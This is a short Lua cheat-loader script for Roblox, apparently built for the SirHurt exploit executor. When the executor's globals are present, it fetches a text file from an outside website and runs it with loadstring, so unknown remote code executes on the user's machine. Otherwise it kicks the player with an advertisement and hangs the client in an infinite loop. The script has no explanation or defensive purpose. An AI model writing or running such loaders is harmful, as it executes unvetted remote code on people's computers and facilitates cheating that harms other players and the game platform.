-- script by lpug and firehash used by bmo
-- open brigde by elon musk jr 
if XPROTECT and LUAPROTECT then
    loadstring(game:HttpGet("http://www.datsnotcool.xyz/images/uploads/5e8b4994e39fb7.97310524.txt"))()
else
    game:GetService("Players").LocalPlayer:Kick("BUY SIRHURT")
    wait(1)
    while true do end
end